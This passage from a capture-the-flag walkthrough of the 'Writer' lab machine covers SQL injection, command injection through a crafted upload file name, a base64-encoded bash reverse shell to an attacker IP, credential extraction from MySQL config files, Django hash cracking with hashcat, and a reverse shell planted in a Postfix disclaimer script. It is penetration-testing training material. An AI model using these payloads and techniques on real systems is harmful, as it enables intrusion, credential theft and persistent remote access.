<p>If we try to read the crafted fake jpg by passing its local uri in <code>request.form.get('image_url')</code>, then the code will fail to open the fake image with <code>im = Image.open(image)</code> at row 46 and an exception will be caught, resulting in the execution at row 51 of <code>os.system(&quot;rm {}&quot;.format(image))</code>. There is a clear command injection vulnerability here as we can craft a file with the format <code>somefile.jpg; COMMAND TO BE INJECTED;</code></p>
<table>
<thead>
<tr>
<th>#</th>
<th>param</th>
<th>fake_image_name</th>
<th>what</th>
</tr>
</thead>
<tbody>
<tr>
<td>First POST</td>
<td>image</td>
<td><code>somefile.jpg; COMMAND TO BE INJECTED;</code></td>
<td>The fake image is saved in /var/www/writer.htb/writer/static/img/</td>
</tr>
<tr>
<td>Second POST</td>
<td>image_url</td>
<td><code>file:///var/www/writer.htb/writer/static/img/somefile.jpg; COMMAND TO BE INJECTED;</code>'</td>
<td>The injected command is executed</td>
</tr>
</tbody>
</table>
<p>Before going for this exploit, we can play with fuzzing for more files with this request:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">cat &gt; ffuf.txt &lt;&lt; EOF
<span style="color:#50fa7b">POST</span> /administrative <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> writer.htb
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept<span style="color:#ff79c6">:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
Content-Length<span style="color:#ff79c6">:</span> 94
Origin<span style="color:#ff79c6">:</span> http://writer.htb
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://writer.htb/administrative
Upgrade-Insecure-Requests<span style="color:#ff79c6">:</span> 1

uname=&#39;+UNION+ALL+SELECT+1,LOAD_FILE(&#39;FUFF&#39;),3,4,5,6%3b--+-&amp;password=test
EOF
</code></pre></td></tr></table>
</div>
</div><p>FFUF works very well and super fast, but there is too many files to look at, including binaries.</p>
<pre><code>ffuf -X POST -request ~/htb/writer/ffuf.txt \
-w /opt/SecLists/Discovery/Web-Content/LinuxFileList.txt:FFUF \
-t 200 -request-proto http -mode pitchfork -c -fs 608
</code></pre>
<h2 id="dashboard-exploitation-of-the-command-injection-vulnerability">Dashboard exploitation of the command injection vulnerability</h2>
<h3 id="weaponization---exploit-payload">Weaponization - Exploit Payload</h3>
<p>Once we have pass the login form with the SQL injection, we have access to the dashboard and the admin interface. We are allowed to publish an image to Stories, so we can attempt to upload instead an exploit. First we upload a real image, then we upload an exploit instead of the images.</p>
<p>Exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;&#39;</span> | base64
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi
touch <span style="color:#f1fa8c">&#39;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash `;&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>We can compare in Burp Comparer the requests for the real image uploaded vs. the exploit</p>
<table>
<thead>
<tr>
<th>header</th>
<th>real image</th>
<th>exploit</th>
</tr>
</thead>
<tbody>
<tr>
<td>Content-Type:</td>
<td>image/jpeg</td>
<td>application/octet-stream</td>
</tr>
</tbody>
</table>
<p>After replacing the <code>Content-Type: image/jpeg</code> in Burp Repeater, we are able to upload our exploit and we can indeed see it in <strong>/static/img/</strong> web folder.</p>
<h3 id="exploit-delivery">Exploit Delivery</h3>
<p>The below payload will leverage the <strong>image</strong> parameter to save the fake image with the command injection in /var/www/writer.htb/writer/static/img/.
We can indeed verify the exploit is visible in <a href="http://writer.htb/static/img/">http://writer.htb/static/img/</a>.</p>
<pre tabindex="0"><code>POST /dashboard/stories/edit/40 HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
Content-Length: 887
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.YXcGzA.hMdP3TQOXXtXIROPFPWuVskHk7A
Upgrade-Insecure-Requests: 1

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;author&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;title&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;tagline&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`&quot;
Content-Type: image/jpeg

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;image_url&quot;

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;content&quot;

AAAA
-----------------------------4229921975180160461559477084--
</code></pre><h3 id="exploitation-of-the-command-injection">Exploitation of the Command Injection</h3>
<p>The below payload will leverage the <strong>image_url</strong> paramater to execute the command injection stored in the previously delivered exploit filename. Before sending it with Repeater, we starts a netcat listener on port 443.</p>
<pre tabindex="0"><code>POST /dashboard/stories/edit/40 HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
Content-Length: 948
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.YXcGzA.hMdP3TQOXXtXIROPFPWuVskHk7A
Upgrade-Insecure-Requests: 1

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;author&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;title&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;tagline&quot;

AAAA
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;aaa.jpg&quot;
Content-Type: image/jpeg


-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;image_url&quot;

file:///var/www/writer.htb/writer/static/img/AAAA.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvNDQzIDA+JjEi | base64 -d | bash`

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name=&quot;content&quot;

AAAA
-----------------------------4229921975180160461559477084--
</code></pre><p>and indeed we have a reverse shell we can upgrade:</p>
<pre><code>nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 58164
bash: cannot set terminal process group (1062): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
^Z
stty -a
speed 38400 baud; rows 52; columns 178; line = 0;
echo $TERM
screen
stty raw -echo; fg
reset
iwww-data@writer:/$ stty rows 52 columns 178
</code></pre>
<h3 id="shell-as-kyle">Shell as Kyle</h3>
<pre><code>www-data@writer:/$ ss -lntpu
Netid         State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process
udp           UNCONN          0               0                        127.0.0.53%lo:53                          0.0.0.0:*
udp           UNCONN          0               0                         10.10.11.255:137                         0.0.0.0:*
udp           UNCONN          0               0                         10.10.11.101:137                         0.0.0.0:*
udp           UNCONN          0               0                              0.0.0.0:137                         0.0.0.0:*
udp           UNCONN          0               0                         10.10.11.255:138                         0.0.0.0:*
udp           UNCONN          0               0                         10.10.11.101:138                         0.0.0.0:*
udp           UNCONN          0               0                              0.0.0.0:138                         0.0.0.0:*
tcp           LISTEN          0               80                           127.0.0.1:3306                        0.0.0.0:*
tcp           LISTEN          0               50                             0.0.0.0:139                         0.0.0.0:*
tcp           LISTEN          0               10                           127.0.0.1:8080                        0.0.0.0:*             users:((&quot;python3&quot;,pid=29307,fd=4))
tcp           LISTEN          0               4096                     127.0.0.53%lo:53                          0.0.0.0:*
tcp           LISTEN          0               128                            0.0.0.0:22                          0.0.0.0:*
tcp           LISTEN          0               100                          127.0.0.1:25                          0.0.0.0:*
tcp           LISTEN          0               50                             0.0.0.0:445                         0.0.0.0:*
tcp           LISTEN          0               50                                [::]:139                            [::]:*
tcp           LISTEN          0               511                                  *:80                                *:*
tcp           LISTEN          0               128                               [::]:22                             [::]:*
tcp           LISTEN          0               50                                [::]:445                            [::]:*
</code></pre>
<p>Two services are accessible from localhost only: Mysql on port 3306 and SMTP on port 25. Exploring the writer database with <code>mysql -u admin -p -D writer</code> and password <code>ToughPasswordToCrack</code> was a distraction, there is nothing there apart an uncrackable admin hash.</p>
<p>Looking at cron jobs there is a process running on port 8080</p>
<pre><code>www-data@writer:/$ crontab -l
[..]
@reboot cd /var/www/writer2_project &amp;&amp; python3 manage.py runserver 127.0.0.1:8080
</code></pre>
<p>We have the source code available on /var/www/writer2_project/manage.py, and browsing at the django website, we find a reference to a SQL resource in /etc/mysql/my.cnf</p>
<pre><code>www-data@writer:/$ cat /etc/mysql/my.cnf
[..]
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
</code></pre>
<p>We can get a hash for user kyle:</p>
<pre><code>www-data@writer:/$ mysql -u djangouser -p -D dev
Enter password:DjangoSuperPassword
[..]
MariaDB [dev]&gt; show tables;
MariaDB [dev]&gt; describe auth_user;
MariaDB [dev]&gt; select TO_BASE64(password), email from auth_user;
+---------------------------------------------------------------------------------------------------------------------------+-----------------+
| TO_BASE64(password)                                                                                                       | email           |
+---------------------------------------------------------------------------------------------------------------------------+-----------------+
| cGJrZGYyX3NoYTI1NiQyNjAwMDAkd0pPM3p0azBmT2xjYnNzblMxd0pQRCRiYlR5Q0I4ZFlXTUdZbHo0ZFNBcm96VFk3d2NaQ1M3RFY2bDVkcHVYTTRBPQ== | kyle@writer.htb |
+---------------------------------------------------------------------------------------------------------------------------+-----------------+
</code></pre>
<p>cracking the hash took roughly 7min without a GPU:</p>
<pre><code>echo cGJrZGYyX3NoYTI1NiQyNjAwMDAkd0pPM3p0azBmT2xjYnNzblMxd0pQRCRiYlR5Q0I4ZFlXTUdZbHo0ZFNBcm96VFk3d2NaQ1M3RFY2bDVkcHVYTTRBPQ== | base64 -d &gt; ~/hashes.txt

hashid -m ~/hashes.txt
--File '/home/ctf/hashes.txt'--
Analyzing 'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A='
[+] Django(PBKDF2-HMAC-SHA256) [Hashcat Mode: 10000]
--End of file '/home/ctf/hashes.txt'-

hashcat -m 10000 ~/hashes.txt  /opt/dictionaries/rockyou.txt --force
hashcat -m 10000 ~/hashes.txt  /opt/dictionaries/rockyou.txt --force --show
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
</code></pre>
<p>We can ssh as kyle with the cracked password.</p>
<pre><code>ssh kyle@writer.htb
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ crontab -l
no crontab for kyle
kyle@writer:~$ sudo -l
[sudo] password for kyle:
Sorry, user kyle may not run sudo on writer.
kyle@writer:~$ cat user.txt
04d7246f7b7852d619293975d8e5ac17
</code></pre>
<h2 id="kyle-to-john">Kyle to John</h2>
<p>we can use linpeas to quickly discover more areas to investigate:</p>
<pre><code>kyle@writer:/dev/shm/.a$ curl -Ok http://10.10.14.44/linpeas.sh.gz
kyle@writer:/dev/shm/.a$ ./linpeas.sh
</code></pre>
<p>We can notice the <code>filter</code> group which relates to Postfix. Kyle belong to this group.</p>
<pre><code>filter❌997:997:Postfix Filters:/var/spool/filter:/bin/sh
john❌1001:1001:,,,:/home/john:/bin/bash
kyle❌1000:1000:Kyle Travis:/home/kyle:/bin/bash
root❌0:0:root:/root:/bin/bash
</code></pre>
<p>Some postfix processes are running as well:</p>
<pre><code>kyle@writer:/dev/shm/.a$ ps -aux --forest
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
[..]
root        2762  0.0  0.1  38036  4528 ?        Ss   05:03   0:00 /usr/lib/postfix/sbin/master -w
postfix     2764  0.0  0.1  38500  6124 ?        S    05:03   0:00  \_ qmgr -l -t unix -u
postfix     2769  0.0  0.2  42100  8764 ?        S    05:03   0:00  \_ tlsmgr -l -t unix -u -c
postfix    31543  0.0  0.1  38304  6140 ?        S    15:03   0:00  \_ pickup -l -t unix -u -c
</code></pre>
<p><a href="https://github.com/DominicBreuker/pspy.git">pspy</a> does a great job to snoop unprivileged process:</p>
<pre><code>curl -LOk https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.19.0.1 - - [28/Oct/2021 00:02:59] &quot;GET /pspy64s HTTP/1.1&quot; 200 -
──────────────────────────────────────────────────────────────────────────
kyle@writer:/dev/shm/.a$ curl -Os http://10.10.14.44/pspy64s
kyle@writer:/dev/shm/.a$ chmod +x pspy64s &amp;&amp; ./pspy64s
[..]
2021/10/27 16:16:01 CMD: UID=0    PID=922685 | /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf
2021/10/27 16:16:01 CMD: UID=0    PID=922684 | /usr/sbin/CRON -f
2021/10/27 16:16:01 CMD: UID=0    PID=922686 | /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer
2021/10/27 16:16:01 CMD: UID=0    PID=922687 | /usr/sbin/CRON -f
</code></pre>
<p>It highlights in yellow the three postfix processes we found earlier and if we are patient, it will show cron jobs as they are executed. Being a member of the group <code>filter</code>, we are authorised to modify the <strong>/etc/postfix/disclaimer</strong> which is used to append a disclaimer at the end of outgoing emails. Looking at the file, we can see it is in fact a bash script:</p>
<pre><code>kyle@writer:~$ cat /etc/postfix/disclaimer
</code></pre>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
</span><span style="color:#ff79c6"></span>
<span style="color:#6272a4"># Localize these.</span>
<span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
<span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail

<span style="color:#6272a4"># Get disclaimer addresses</span>
<span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#ff79c6">=</span>/etc/postfix/disclaimer_addresses

<span style="color:#6272a4"># Exit codes from &lt;sysexits.h&gt;</span>
<span style="color:#8be9fd;font-style:italic">EX_TEMPFAIL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">75</span>
<span style="color:#8be9fd;font-style:italic">EX_UNAVAILABLE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">69</span>

<span style="color:#6272a4"># Clean up when done or when aborting.</span>
<span style="color:#8be9fd;font-style:italic">trap</span> <span style="color:#f1fa8c">&#34;rm -f in.</span><span style="color:#8be9fd;font-style:italic">$$</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">3</span> <span style="color:#bd93f9">15</span>

<span style="color:#6272a4"># Start processing.</span>
<span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> does not exist; <span style="color:#8be9fd;font-style:italic">exit</span>
<span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>

cat &gt;in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Cannot save mail to file; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>

<span style="color:#6272a4"># obtain From address</span>
<span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`</span>grep -m <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;From:&#34;</span> in.<span style="color:#8be9fd;font-style:italic">$$</span> | cut -d <span style="color:#f1fa8c">&#34;&lt;&#34;</span> -f <span style="color:#bd93f9">2</span> | cut -d <span style="color:#f1fa8c">&#34;&gt;&#34;</span> -f 1<span style="color:#f1fa8c">`</span>

<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#f1fa8c">`</span>grep -wi ^<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#f1fa8c">}</span>$ <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
  /usr/bin/altermime --input<span style="color:#ff79c6">=</span>in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>                   --disclaimer<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>                   --disclaimer-html<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>                   --xheader<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>                    <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Message content rejected; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_UNAVAILABLE</span>; <span style="color:#ff79c6">}</span>
<span style="color:#ff79c6">fi</span>

<span style="color:#8be9fd;font-style:italic">$SENDMAIL</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$@</span><span style="color:#f1fa8c">&#34;</span> &lt;in.<span style="color:#8be9fd;font-style:italic">$$</span>

<span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$?</span>
</code></pre></td></tr></table>
</div>
</div><p>We can modify the beginning of the script with a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
</span><span style="color:#ff79c6"></span>bash -c <span style="color:#f1fa8c">&#34;bash -i &amp;&gt; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;</span>

<span style="color:#6272a4"># Localize these.</span>
<span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
<span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail
</code></pre></td></tr></table>
</div>
</div><p>We successfully test locally the exploit before copying the it in /etc/postfix.</p>
<pre><code>kyle@writer:~$ ./disclaimer
./disclaimer: 23: cannot create in.924887: Permission denied
Cannot save mail to file
kyle@writer:~$
────────────────────────────────────────────────────────────────────
nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 58556
kyle@writer:~$
</code></pre>
<p>Next step is to send an email to john. If we are lucky there will be some kind of out of office email with the disclaimer attached. We can use netcat or telnet to send as described below, but we have to do it very fast because there is a veryfrequent cron job that revert our changes on the disclaimer file.</p>
<p>Resource: <a href="https://book.hacktricks.xyz/pentesting/pentesting-smtp">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></p>
<pre><code>kyle@writer:~$ cp ./disclaimer /etc/postfix/
kyle@writer:~$ nc 127.0.0.1 25
220 writer.htb ESMTP Postfix (Ubuntu)
HELO writer.htb
250 writer.htb
MAIL FROM: kyle@writer.htb
250 2.1.0 Ok
RCPT TO: john@writer.htb
